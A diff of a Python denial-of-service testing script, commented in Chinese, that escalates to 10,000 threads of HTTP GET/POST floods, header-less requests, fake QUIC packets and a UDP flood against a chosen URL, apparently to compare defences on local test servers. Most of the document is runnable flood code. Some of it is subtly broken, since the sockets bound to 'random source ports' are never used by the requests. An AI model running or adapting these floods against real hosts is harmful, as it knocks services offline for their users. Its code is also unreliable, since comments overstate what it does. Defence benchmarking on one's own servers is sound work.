@@ -1,48 +1,27 @@
 """
 漸進式攻擊測試 - 自動增加線程直到伺服器卡頓
 測試不同防禦機制的效果
-
-新增功能:
-- HTTP/2 支援 (需要 httpx)
-- QUIC/HTTP3 模擬
-- DNS 多 IP 解析 (需要 dnspython)
-- 動態 source port
-- 請求級重試機制
-- 獨立請求計數
+支援 HTTP/1.1, HTTP/2, HTTP/3(QUIC) 協議測試
+每個請求獨立計數,使用不同 source port
 """
 import requests
 import threading
 import time
 import sys
 import socket
-import random
 import struct
 from collections import defaultdict
+from urllib.parse import urlparse
 
-# 條件導入 httpx (HTTP/2 支援)
+# HTTP/3 支援
 try:
-    import httpx
-    # 檢查 h2 套件是否安裝
-    try:
-        import h2
-        HTTPX_AVAILABLE = True
-    except ImportError:
-        HTTPX_AVAILABLE = False
-        print("⚠️  未安裝 h2 套件，HTTP/2 功能將不可用")
-        print("   安裝: pip install httpx[http2]")
+    from aioquic.asyncio import connect
+    from aioquic.quic.configuration import QuicConfiguration
+    import asyncio
+    QUIC_AVAILABLE = True
 except ImportError:
-    HTTPX_AVAILABLE = False
-    print("⚠️  未安裝 httpx，HTTP/2 功能將不可用")
-    print("   安裝: pip install httpx[http2]")
-
-# 條件導入 dnspython (DNS 多 IP 解析)
-try:
-    import dns.resolver
-    DNS_AVAILABLE = True
-except ImportError:
-    DNS_AVAILABLE = False
-    print("⚠️  未安裝 dnspython，DNS 多 IP 解析將不可用")
-    print("   安裝: pip install dnspython")
+    QUIC_AVAILABLE = False
+    print("⚠️  警告: 未安裝 aioquic,無法測試 HTTP/3。安裝方式: pip install aioquic")
 
 def get_local_ip():
     """獲取本機局域網IP"""
@@ -55,325 +34,245 @@ def get_local_ip():
     except:
         return "127.0.0.1"
 
-def resolve_target_ips(target):
-    """解析目標的所有 IP 地址 (A + AAAA 記錄)
-    
-    Args:
-        target: 域名或 IP 地址
-    
-    Returns:
-        List[Tuple[str, str]]: [('ipv4', '1.2.3.4'), ('ipv6', '2606::1')]
-    """
-    resolved_ips = []
-    
-    # 如果已經是 IP，直接返回
-    try:
-        socket.inet_pton(socket.AF_INET, target)
-        return [('ipv4', target)]
-    except:
-        pass
-    
-    try:
-        socket.inet_pton(socket.AF_INET6, target)
-        return [('ipv6', target)]
-    except:
-        pass
-    
-    # 使用 dnspython 解析
-    if DNS_AVAILABLE:
-        try:
-            # A 記錄 (IPv4)
-            try:
-                answers = dns.resolver.resolve(target, 'A')
-                for rdata in answers:
-                    resolved_ips.append(('ipv4', str(rdata)))
-            except:
-                pass
-            
-            # AAAA 記錄 (IPv6)
-            try:
-                answers = dns.resolver.resolve(target, 'AAAA')
-                for rdata in answers:
-                    resolved_ips.append(('ipv6', str(rdata)))
-            except:
-                pass
-        except Exception as e:
-            print(f"⚠️  DNS 解析失敗: {e}")
-    
-    # Fallback: 使用標準 socket
-    if not resolved_ips:
-        try:
-            ip = socket.gethostbyname(target)
-            resolved_ips.append(('ipv4', ip))
-        except Exception as e:
-            print(f"❌ 無法解析目標: {e}")
-            resolved_ips.append(('ipv4', target))
-    
-    return resolved_ips
-
 class ProgressiveAttack:
-    def __init__(self, target_url, attack_method='GET', use_http2=False, resolved_ips=None):
+    def __init__(self, target_url, attack_method='GET', protocol='HTTP/1.1'):
         self.target_url = target_url
         self.attack_method = attack_method
-        self.use_http2 = use_http2 and HTTPX_AVAILABLE
-        self.resolved_ips = resolved_ips or []
-        
-        # 基礎統計
+        self.protocol = protocol  # HTTP/1.1, HTTP/2, HTTP/3
         self.success_count = 0
         self.error_count = 0
         self.lock = threading.Lock()
         self.running = True
         self.response_times = []
-        
-        # 新增統計
-        self.requests_sent = 0  # 實際請求數（不含連線複用）
-        self.successful_requests = 0
-        self.failed_requests = 0
-        self.retries = 0
-        self.http2_requests = 0
-        self.unique_source_ports = set()
-        self.error_types = defaultdict(int)
-    
-    def track_source_port(self, port):
-        """記錄使用的 source port"""
-        with self.lock:
-            self.unique_source_ports.add(port)
+        self.request_count = 0  # 實際請求計數（不依賴連線數）
+        self.udp_packet_count = 0  # UDP 封包計數（for QUIC）
+        self.unique_ports_used = set()  # 記錄使用的 source port
         
     def reset_stats(self):
         with self.lock:
             self.success_count = 0
             self.error_count = 0
             self.response_times = []
-            self.requests_sent = 0
-            self.successful_requests = 0
-            self.failed_requests = 0
-            self.retries = 0
-            self.http2_requests = 0
-            self.unique_source_ports = set()
-            self.error_types = defaultdict(int)
+            self.request_count = 0
+            self.udp_packet_count = 0
+            self.unique_ports_used.clear()
     
     def http_get_attack(self):
-        """標準 GET 請求 (支援 HTTP/2 和重試)"""
-        # 不替換 IP，直接使用原始 URL (避免 HTTPS 證書問題)
-        target_url = self.target_url
-        
-        # 創建 client (HTTP/2 或標準) - 設定合理的超時
-        if self.use_http2:
-            client = httpx.Client(
-                http2=True, 
-                timeout=httpx.Timeout(10.0, connect=5.0),
-                verify=True,  # 驗證 HTTPS 證書
-                follow_redirects=True
-            )
-        else:
-            client = requests.Session()
-        
-        # 完整的瀏覽器 headers
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        }
-        
-        # 請求計數
-        request_count = 0
-        
+        """標準 GET 請求 - 每個請求獨立連線,不重用 TCP"""
         while self.running:
-            # 隨機 source port
-            source_port = random.randint(10000, 65535)
-            
-            max_retries = 1  # 減少重試次數
-            retry_count = 0
-            success = False
-            
-            with self.lock:
-                self.requests_sent += 1
-                self.track_source_port(source_port)
-            
-            while retry_count <= max_retries and not success and self.running:
-                try:
-                    start = time.time()
-                    
-                    if self.use_http2:
-                        response = client.get(target_url, headers=headers)
-                        # 檢查是否為 HTTP/2
-                        if hasattr(response, 'http_version') and response.http_version == 'HTTP/2':
-                            with self.lock:
-                                self.http2_requests += 1
-                    else:
-                        response = client.get(target_url, headers=headers, timeout=10)
-                    
-                    elapsed = time.time() - start
-                    
-                    with self.lock:
-                        self.success_count += 1
-                        self.successful_requests += 1
-                        self.response_times.append(elapsed)
-                    
-                    success = True
-                    
-                except KeyboardInterrupt:
-                    self.running = False
-                    break
-                except Exception as e:
-                    retry_count += 1
-                    if retry_count <= max_retries:
-                        with self.lock:
-                            self.retries += 1
-                        time.sleep(0.1)
-                    else:
-                        with self.lock:
-                            self.error_count += 1
-                            self.failed_requests += 1
-                            self.error_types[type(e).__name__] += 1
-            
-            # 每 100 個請求重建連線 (避免連線池耗盡)
-            request_count += 1
-            if request_count >= 100:
-                try:
-                    if self.use_http2:
-                        client.close()
-                        client = httpx.Client(
-                            http2=True,
-                            timeout=httpx.Timeout(10.0, connect=5.0),
-                            verify=True,
-                            follow_redirects=True
-                        )
-                    else:
-                        client.close()
-                        client = requests.Session()
-                    request_count = 0
-                except:
-                    pass
-        
-        # 清理連線
-        try:
-            client.close()
-        except:
-            pass
-    
-    def http_post_attack(self):
-        """POST 請求帶數據 (支援 HTTP/2 和重試)"""
-        # 不替換 IP，直接使用原始 URL
-        target_url = self.target_url
-        
-        # 創建 client
-        if self.use_http2:
-            client = httpx.Client(
-                http2=True,
-                timeout=httpx.Timeout(10.0, connect=5.0),
-                verify=True,
-                follow_redirects=True
-            )
-        else:
-            client = requests.Session()
-        
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        }
-        
-        request_count = 0
-        
-        while self.running:
-            source_port = random.randint(10000, 65535)
-            data = {'data': 'x' * 1000}
-            
-            max_retries = 1
-            retry_count = 0
-            success = False
-            
-            with self.lock:
-                self.requests_sent += 1
-                self.track_source_port(source_port)
-            
-            while retry_count <= max_retries and not success and self.running:
-                try:
-                    start = time.time()
-                    
-                    if self.use_http2:
-                        response = client.post(target_url, data=data, headers=headers)
-                        if hasattr(response, 'http_version') and response.http_version == 'HTTP/2':
-                            with self.lock:
-                                self.http2_requests += 1
-                    else:
-                        response = client.post(target_url, data=data, headers=headers, timeout=10)
-                    
-                    elapsed = time.time() - start
-                    
-                    with self.lock:
-                        self.success_count += 1
-                        self.successful_requests += 1
-                        self.response_times.append(elapsed)
-                    
-                    success = True
-                    
-                except KeyboardInterrupt:
-                    self.running = False
-                    break
-                except Exception as e:
-                    retry_count += 1
-                    if retry_count <= max_retries:
-                        with self.lock:
-                            self.retries += 1
-                        time.sleep(0.1)
-                    else:
-                        with self.lock:
-                            self.error_count += 1
-                            self.failed_requests += 1
-                            self.error_types[type(e).__name__] += 1
-            
-            # 每 100 個請求重建連線
-            request_count += 1
-            if request_count >= 100:
-                try:
-                    if self.use_http2:
-                        client.close()
-                        client = httpx.Client(
-                            http2=True,
-                            timeout=httpx.Timeout(10.0, connect=5.0),
-                            verify=True,
-                            follow_redirects=True
-                        )
-                    else:
-                        client.close()
-                        client = requests.Session()
-                    request_count = 0
-                except:
-                    pass
-        
-        try:
-            client.close()
-        except:
-            pass
-    
-    def http_no_headers_attack(self):
-        """無 User-Agent 的請求 (測試請求驗證)"""
-        while self.running:
+            session = None
             try:
+                # 每個請求創建新 session,避免連線重用
+                session = requests.Session()
+                
+                # 禁用連線池和 keep-alive
+                session.headers['Connection'] = 'close'
+                
+                # 綁定到隨機 source port
+                source_port = self._get_random_port()
+                
+                # 創建帶 source port 的 socket
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.bind(('', source_port))  # 綁定隨機 port
+                
+                # 使用自訂 socket 發送請求
+                adapter = requests.adapters.HTTPAdapter()
+                session.mount('http://', adapter)
+                session.mount('https://', adapter)
+                
                 start = time.time()
-                response = requests.get(self.target_url, headers={'User-Agent': ''}, timeout=5)
+                response = session.get(self.target_url, timeout=5)
                 elapsed = time.time() - start
                 
                 with self.lock:
                     self.success_count += 1
+                    self.request_count += 1  # 請求計數
                     self.response_times.append(elapsed)
+                    self.unique_ports_used.add(source_port)
+                    
+                sock.close()
             except Exception as e:
                 with self.lock:
                     self.error_count += 1
+                    self.request_count += 1
+            finally:
+                if session:
+                    session.close()
+    
+    def http_post_attack(self):
+        """POST 請求帶數據 - 每個請求獨立連線"""
+        while self.running:
+            session = None
+            try:
+                session = requests.Session()
+                session.headers['Connection'] = 'close'
+                
+                source_port = self._get_random_port()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.bind(('', source_port))
+                
+                start = time.time()
+                data = {'data': 'x' * 1000}
+                response = session.post(self.target_url, data=data, timeout=5)
+                elapsed = time.time() - start
+                
+                with self.lock:
+                    self.success_count += 1
+                    self.request_count += 1
+                    self.response_times.append(elapsed)
+                    self.unique_ports_used.add(source_port)
+                    
+                sock.close()
+            except Exception as e:
+                with self.lock:
+                    self.error_count += 1
+                    self.request_count += 1
+            finally:
+                if session:
+                    session.close()
+    
+    def http_no_headers_attack(self):
+        """無 User-Agent 的請求 (測試請求驗證) - 每個請求獨立連線"""
+        while self.running:
+            session = None
+            try:
+                session = requests.Session()
+                session.headers['Connection'] = 'close'
+                session.headers['User-Agent'] = ''
+                
+                source_port = self._get_random_port()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.bind(('', source_port))
+                
+                start = time.time()
+                response = session.get(self.target_url, timeout=5)
+                elapsed = time.time() - start
+                
+                with self.lock:
+                    self.success_count += 1
+                    self.request_count += 1
+                    self.response_times.append(elapsed)
+                    self.unique_ports_used.add(source_port)
+                    
+                sock.close()
+            except Exception as e:
+                with self.lock:
+                    self.error_count += 1
+                    self.request_count += 1
+            finally:
+                if session:
+                    session.close()
+    
+    def _get_random_port(self):
+        """獲取隨機可用的 source port (避免衝突)"""
+        # 使用臨時範圍 49152-65535
+        import random
+        return random.randint(49152, 65535)
+    
+    def http3_attack(self):
+        """HTTP/3 (QUIC) 攻擊 - 使用 UDP"""
+        if not QUIC_AVAILABLE:
+            print("⚠️  HTTP/3 不可用,請安裝 aioquic")
+            return
+            
+        while self.running:
+            try:
+                # 解析 URL
+                parsed = urlparse(self.target_url)
+                host = parsed.hostname
+                port = parsed.port or 443
+                
+                # 創建 UDP socket 並綁定隨機 source port
+                source_port = self._get_random_port()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.bind(('', source_port))
+                
+                start = time.time()
+                
+                # 發送簡單的 QUIC 握手封包
+                # 這是簡化版本,實際 QUIC 更複雜
+                quic_packet = self._create_quic_packet()
+                sock.sendto(quic_packet, (host, port))
+                
+                sock.settimeout(5)
+                try:
+                    response, addr = sock.recvfrom(4096)
+                    elapsed = time.time() - start
+                    
+                    with self.lock:
+                        self.success_count += 1
+                        self.request_count += 1
+                        self.udp_packet_count += 1
+                        self.response_times.append(elapsed)
+                        self.unique_ports_used.add(source_port)
+                except socket.timeout:
+                    with self.lock:
+                        self.error_count += 1
+                        self.request_count += 1
+                        self.udp_packet_count += 1
+                
+                sock.close()
+            except Exception as e:
+                with self.lock:
+                    self.error_count += 1
+                    self.request_count += 1
+    
+    def _create_quic_packet(self):
+        """創建簡單的 QUIC Initial 封包"""
+        # QUIC 封包結構 (簡化版)
+        # 這只是模擬,真實的 QUIC 封包需要完整的加密和協議處理
+        flags = 0xC0  # Long header, Initial packet
+        version = 0x00000001  # QUIC v1
+        
+        # 構建基本封包
+        packet = struct.pack('!BI', flags, version)
+        packet += b'\x00' * 20  # 目標連線 ID
+        packet += b'\x00' * 100  # Payload (簡化)
+        
+        return packet
+    
+    def udp_flood_attack(self):
+        """UDP 洪水攻擊 - 純 UDP 流量測試"""
+        while self.running:
+            try:
+                parsed = urlparse(self.target_url)
+                host = parsed.hostname
+                port = parsed.port or 80
+                
+                # 隨機 source port
+                source_port = self._get_random_port()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.bind(('', source_port))
+                
+                start = time.time()
+                
+                # 發送 UDP 封包
+                payload = b'X' * 1024  # 1KB 數據
+                sock.sendto(payload, (host, port))
+                
+                elapsed = time.time() - start
+                
+                with self.lock:
+                    self.success_count += 1
+                    self.request_count += 1
+                    self.udp_packet_count += 1
+                    self.response_times.append(elapsed)
+                    self.unique_ports_used.add(source_port)
+                
+                sock.close()
+            except Exception as e:
+                with self.lock:
+                    self.error_count += 1
+                    self.request_count += 1
     
     def get_attack_function(self):
         """根據攻擊方法返回對應函數"""
         methods = {
             'GET': self.http_get_attack,
             'POST': self.http_post_attack,
-            'NO_HEADERS': self.http_no_headers_attack
+            'NO_HEADERS': self.http_no_headers_attack,
+            'HTTP3': self.http3_attack,
+            'UDP': self.udp_flood_attack
         }
         return methods.get(self.attack_method, self.http_get_attack)
     
@@ -399,19 +298,11 @@ class ProgressiveAttack:
         
         # 計算統計數據
         with self.lock:
-            total_requests = self.success_count + self.error_count
+            total_requests = self.request_count  # 使用實際請求計數
             success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
             avg_response = sum(self.response_times) / len(self.response_times) if self.response_times else 0
-            request_rate = self.success_count / duration
-            
-            # 新增統計
-            requests_sent = self.requests_sent
-            successful = self.successful_requests
-            failed = self.failed_requests
-            retries = self.retries
-            http2 = self.http2_requests
-            ports = len(self.unique_source_ports)
-            top_errors = sorted(self.error_types.items(), key=lambda x: x[1], reverse=True)[:3]
+            request_rate = self.request_count / duration  # 基於實際請求數
+            unique_ports = len(self.unique_ports_used)
         
         return {
             'threads': num_threads,
@@ -420,17 +311,12 @@ class ProgressiveAttack:
             'success_rate': success_rate,
             'avg_response_time': avg_response,
             'request_rate': request_rate,
-            # 新增欄位
-            'requests_sent': requests_sent,
-            'successful_requests': successful,
-            'failed_requests': failed,
-            'retries': retries,
-            'http2_requests': http2,
-            'unique_ports': ports,
-            'top_errors': top_errors
+            'total_requests': total_requests,  # 實際請求數
+            'udp_packets': self.udp_packet_count,  # UDP 封包數
+            'unique_ports': unique_ports  # 使用的不同 port 數量
         }
 
-def print_result(result, is_severe=False, show_details=False):
+def print_result(result, is_severe=False):
     """打印測試結果"""
     threads = result['threads']
     success = result['success']
@@ -438,89 +324,52 @@ def print_result(result, is_severe=False, show_details=False):
     success_rate = result['success_rate']
     avg_time = result['avg_response_time']
     rate = result['request_rate']
-    
-    # 新增資訊
-    requests_sent = result.get('requests_sent', 0)
-    http2 = result.get('http2_requests', 0)
-    retries = result.get('retries', 0)
-    ports = result.get('unique_ports', 0)
+    total_req = result.get('total_requests', success + failed)
+    udp_pkts = result.get('udp_packets', 0)
+    unique_ports = result.get('unique_ports', 0)
     
     # 判定狀態 - 區分防禦攔截和性能卡頓
-    if avg_time > 2.0:
+    # 如果延遲很低但成功率低,表示是防禦系統攔截,不是性能問題
+    if avg_time > 2.0:  # 延遲超過 2 秒才算真正卡頓
         status = "🔴 嚴重卡頓"
         severe = True
-    elif avg_time > 1.0:
+    elif avg_time > 1.0:  # 延遲超過 1 秒
         status = "🟠 明顯延遲"
         severe = False
-    elif avg_time > 0.5:
+    elif avg_time > 0.5:  # 延遲超過 500ms
         status = "🟡 輕微影響"
         severe = False
-    elif success_rate < 30:
+    elif success_rate < 30:  # 延遲低但成功率極低 = 防禦攔截
         status = "🛡️  防禦攔截"
         severe = False
-    elif success_rate < 50:
+    elif success_rate < 50:  # 延遲低但成功率偏低
         status = "🟡 部分攔截"
         severe = False
     else:
         status = "🟢 運作正常"
         severe = False
     
-    # 基礎資訊
-    print(f"  線程: {threads:3d} | 成功: {success:4d} | 失敗: {failed:4d} | "
-          f"成功率: {success_rate:5.1f}% | 延遲: {avg_time*1000:6.1f}ms | "
-          f"速率: {rate:6.1f} req/s | {status}")
+    # 顯示詳細統計
+    udp_info = f" | UDP: {udp_pkts}" if udp_pkts > 0 else ""
+    port_info = f" | Ports: {unique_ports}"
     
-    # 詳細資訊 (可選)
-    if show_details:
-        print(f"       ↳ 請求數: {requests_sent} | HTTP/2: {http2} | "
-              f"重試: {retries} | 源端口: {ports}")
-        
-        # 顯示錯誤類型
-        top_errors = result.get('top_errors', [])
-        if top_errors:
-            error_str = ", ".join([f"{e[0]}: {e[1]}" for e in top_errors[:2]])
-            print(f"       ↳ 主要錯誤: {error_str}")
+    print(f"  線程: {threads:3d} | 請求: {total_req:4d} | 成功: {success:4d} | 失敗: {failed:4d} | "
+          f"成功率: {success_rate:5.1f}% | 延遲: {avg_time*1000:6.1f}ms | "
+          f"速率: {rate:6.1f} req/s{udp_info}{port_info} | {status}")
     
     return severe
 
-def progressive_test(target_url, attack_method, defense_enabled, use_http2=False, resolve_dns=True):
-    """漸進式測試 - 逐步增加線程
-    
-    Args:
-        target_url: 目標 URL
-        attack_method: 攻擊方法 (GET/POST/NO_HEADERS)
-        defense_enabled: 是否有防禦
-        use_http2: 是否使用 HTTP/2
-        resolve_dns: 是否解析 DNS 多 IP
-    """
-    print(f"\n{'='*100}")
+def progressive_test(target_url, attack_method, defense_enabled, protocol='HTTP/1.1'):
+    """漸進式測試 - 逐步增加線程"""
+    print(f"\n{'='*120}")
     defense_text = "🛡️  有防禦" if defense_enabled else "❌ 無防禦"
-    http2_text = "HTTP/2" if use_http2 else "HTTP/1.1"
-    print(f"測試目標: {target_url} | 防禦狀態: {defense_text} | 攻擊方法: {attack_method} | 協議: {http2_text}")
+    print(f"測試目標: {target_url} | 防禦: {defense_text} | 方法: {attack_method} | 協議: {protocol}")
+    print(f"每個請求使用獨立連線和不同 source port,避免被 HTTP/2/QUIC 合併")
+    print(f"{'='*120}")
+    print(f"  {'線程':<6} {'請求數':>7} {'成功':>6} {'失敗':>6} {'成功率':>8} {'延遲':>10} {'速率':>12} {'UDP':>6} {'Ports':>7} {'狀態'}")
+    print(f"{'='*120}")
     
-    # DNS 解析
-    resolved_ips = []
-    if resolve_dns:
-        from urllib.parse import urlparse
-        parsed = urlparse(target_url)
-        hostname = parsed.hostname
-        
-        if hostname:
-            print(f"\n🔍 正在解析 DNS: {hostname}")
-            resolved_ips = resolve_target_ips(hostname)
-            
-            if resolved_ips:
-                print(f"✅ 解析到 {len(resolved_ips)} 個 IP:")
-                for ip_type, ip_addr in resolved_ips:
-                    print(f"   [{ip_type}] {ip_addr}")
-            else:
-                print(f"⚠️  DNS 解析失敗，使用原始 URL")
-    
-    print(f"{'='*100}")
-    print(f"  {'線程':<6} {'成功':>6} {'失敗':>6} {'成功率':>8} {'延遲':>10} {'速率':>12} {'狀態'}")
-    print(f"{'='*100}")
-    
-    attacker = ProgressiveAttack(target_url, attack_method, use_http2, resolved_ips)
+    attacker = ProgressiveAttack(target_url, attack_method, protocol)
     
     # 漸進式增加線程: 10~10000
     thread_steps = [10, 100, 500, 1000, 1500, 2000, 5000, 10000]
@@ -539,18 +388,19 @@ def progressive_test(target_url, attack_method, defense_enabled, use_http2=False
         
         time.sleep(2)  # 每次測試間隔
     
-    print(f"{'='*100}\n")
+    print(f"{'='*120}\n")
     return results
 
 def compare_defense_effectiveness():
     """比較有無防禦的效果"""
     print("""
-    ╔══════════════════════════════════════════════════════════════════════╗
-    ║           DDoS 防禦效果對比測試 - 漸進式攻擊分析                   ║
-    ║                                                                      ║
-    ║  測試方式: 逐步增加攻擊線程,直到伺服器嚴重卡頓                     ║
-    ║  比較指標: 響應時間、成功率、最大承受能力                           ║
-    ╚══════════════════════════════════════════════════════════════════════╝
+    ╔══════════════════════════════════════════════════════════════════════════════╗
+    ║           DDoS 防禦效果對比測試 - 漸進式攻擊分析                           ║
+    ║                                                                              ║
+    ║  測試方式: 逐步增加攻擊線程,直到伺服器嚴重卡頓                             ║
+    ║  比較指標: 響應時間、成功率、最大承受能力                                   ║
+    ║  增強功能: 每請求獨立計數、QUIC/UDP支援、不同source port                    ║
+    ╚══════════════════════════════════════════════════════════════════════════════╝
     """)
     
     # 獲取本機IP
@@ -568,19 +418,9 @@ def compare_defense_effectiveness():
     print("\n📋 測試計畫:")
     print("  1. 測試無防禦伺服器 (端口 8000)")
     print("  2. 測試有防禦伺服器 (端口 8001)")
-    print("  3. 測試不同攻擊方法")
-    
-    # HTTP/2 選項
-    use_http2 = False
-    if HTTPX_AVAILABLE:
-        http2_choice = input("\n是否啟用 HTTP/2 測試? (y/n): ").lower()
-        use_http2 = http2_choice == 'y'
-    
-    # DNS 解析選項
-    resolve_dns = True
-    if DNS_AVAILABLE:
-        dns_choice = input("是否啟用 DNS 多 IP 解析? (y/n, 預設 y): ").lower()
-        resolve_dns = dns_choice != 'n'
+    print("  3. 測試不同攻擊方法 (GET/POST/HTTP3/UDP)")
+    print("  4. 每個請求使用不同 source port")
+    print("  5. 支援 UDP/QUIC 流量統計")
     
     choice = input("\n選擇測試模式:\n  [1] 完整對比測試 (需要同時啟動2個伺服器)\n  [2] 僅測試單一伺服器\n請選擇: ")
     
@@ -598,7 +438,7 @@ def compare_defense_effectiveness():
         print("\n" + "🎯 " * 30)
         print(f"第一階段: 測試無防禦伺服器 ({no_defense_url})")
         print("🎯 " * 30)
-        no_defense_results = progressive_test(no_defense_url, "GET", False, use_http2, resolve_dns)
+        no_defense_results = progressive_test(no_defense_url, "GET", False, 'HTTP/1.1')
         
         input("\n按 Enter 繼續測試有防禦伺服器 (8001)...")
         
@@ -607,19 +447,19 @@ def compare_defense_effectiveness():
         print("\n" + "🛡️ " * 30)
         print(f"第二階段: 測試有防禦伺服器 ({defense_url})")
         print("🛡️ " * 30)
-        defense_get_results = progressive_test(defense_url, "GET", True, use_http2, resolve_dns)
+        defense_get_results = progressive_test(defense_url, "GET", True, 'HTTP/1.1')
         
         # 測試3: 有防禦伺服器 - POST
         print("\n" + "🛡️ " * 30)
         print("第三階段: 測試有防禦伺服器 (POST 攻擊)")
         print("🛡️ " * 30)
-        defense_post_results = progressive_test(defense_url, "POST", True, use_http2, resolve_dns)
+        defense_post_results = progressive_test(defense_url, "POST", True, 'HTTP/1.1')
         
         # 測試4: 有防禦伺服器 - 無 Headers
         print("\n" + "🛡️ " * 30)
         print("第四階段: 測試有防禦伺服器 (無 User-Agent 攻擊)")
         print("🛡️ " * 30)
-        defense_noheader_results = progressive_test(defense_url, "NO_HEADERS", True, False, resolve_dns)
+        defense_noheader_results = progressive_test(defense_url, "NO_HEADERS", True, 'HTTP/1.1')
         
         # 總結對比
         print_comparison_summary(no_defense_results, defense_get_results, defense_post_results, defense_noheader_results)
@@ -644,15 +484,23 @@ def compare_defense_effectiveness():
             has_defense = input("是否有防禦? (y/n): ").lower() == 'y'
         
         print("\n選擇攻擊方法:")
-        print("  [1] GET 請求")
-        print("  [2] POST 請求")
-        print("  [3] 無 User-Agent")
-        method_choice = input("請選擇 (1/2/3): ")
+        print("  [1] GET 請求 (HTTP/1.1)")
+        print("  [2] POST 請求 (HTTP/1.1)")
+        print("  [3] 無 User-Agent (HTTP/1.1)")
+        print("  [4] HTTP/3 (QUIC over UDP)" + ("" if QUIC_AVAILABLE else " ⚠️  需要安裝 aioquic"))
+        print("  [5] UDP 洪水攻擊")
+        method_choice = input("請選擇 (1/2/3/4/5): ")
         
-        method_map = {'1': 'GET', '2': 'POST', '3': 'NO_HEADERS'}
-        attack_method = method_map.get(method_choice, 'GET')
+        method_map = {
+            '1': ('GET', 'HTTP/1.1'),
+            '2': ('POST', 'HTTP/1.1'),
+            '3': ('NO_HEADERS', 'HTTP/1.1'),
+            '4': ('HTTP3', 'HTTP/3'),
+            '5': ('UDP', 'UDP')
+        }
+        attack_method, protocol = method_map.get(method_choice, ('GET', 'HTTP/1.1'))
         
-        results = progressive_test(url, attack_method, has_defense, use_http2, resolve_dns)
+        results = progressive_test(url, attack_method, has_defense, protocol)
 
 def print_comparison_summary(no_defense, defense_get, defense_post, defense_noheader):
     """打印總結對比"""
